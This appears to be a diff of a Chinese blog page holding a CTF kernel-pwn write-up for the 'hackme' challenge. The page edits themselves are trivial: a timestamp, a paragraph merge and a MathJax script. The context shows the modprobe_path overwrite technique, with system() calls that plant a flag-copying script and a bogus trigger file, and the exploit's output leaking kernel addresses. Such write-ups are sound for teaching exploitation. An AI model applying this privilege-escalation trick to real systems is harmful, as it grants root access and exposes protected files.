@@ -19,7 +19,7 @@
 <meta property="og:description" content="以往比赛的Kernel Pwn题目分析（持续更新）">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="/images/og_image.png">
-<meta property="og:updated_time" content="2020-02-18T09:28:18.023Z">
+<meta property="og:updated_time" content="2020-02-18T09:30:26.765Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Kernel Pwn题目的实战">
 <meta name="twitter:description" content="以往比赛的Kernel Pwn题目分析（持续更新）">
@@ -342,8 +342,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">cp /flag /home/pwn</span><br><span class="line">chmod 777 /home/pwn/flag</span><br></pre></td></tr></table></figure>
 <p>还有一个错误格式的可执行文件，总共就是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\ncp /flag /home/pwn\nchmod 777 /home/pwn/flag' &gt; /home/pwn/catflag.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/catflag.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xf1\\xf2\\xf3\\xf4' &gt; /home/pwn/trigger"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/trigger"</span>);</span><br></pre></td></tr></table></figure>
-<p>修改modprobe_path的内容为/home/pwn/catflag.sh，在调用/home/pwn/trigger的时候就会执行</p>
-<p>/home/pwn/catflag.sh</p>
+<p>修改modprobe_path的内容为/home/pwn/catflag.sh，在调用/home/pwn/trigger的时候就会执行/home/pwn/catflag.sh</p>
 <p>当然这里我先leak模块的地址，通过调试发现，在pool高地址处有合适的值来直接读出地址，leak了模块地址后fastbin attack到pool，改pool上的指针指向modprobe_path，然后就可以编辑了</p>
 <p>调用的脚本无法直接回显flag，于是先cp到家目录，再修改权限就能读取了</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  hackme ./startvm.sh </span><br><span class="line"></span><br><span class="line">        #   #    ####    #####  ######</span><br><span class="line">         # #    #    #     #    #</span><br><span class="line">       ### ###  #          #    #####</span><br><span class="line">         # #    #          #    #</span><br><span class="line">        #   #   #    #     #    #</span><br><span class="line">                 ####      #    #</span><br><span class="line"></span><br><span class="line">~ $ ls</span><br><span class="line">exp        hackme.ko</span><br><span class="line">~ $ ./exp </span><br><span class="line">kernel address:0xffffffffb2449ae0</span><br><span class="line">lkm address: 0xffffffffc002d000</span><br><span class="line">/home/pwn/trigger: line 1: ����: not found</span><br><span class="line">*CTF&#123;test&#125;</span><br><span class="line">~ $ ls</span><br><span class="line">catflag.sh  exp         flag        hackme.ko   trigger</span><br></pre></td></tr></table></figure>
@@ -799,5 +798,20 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
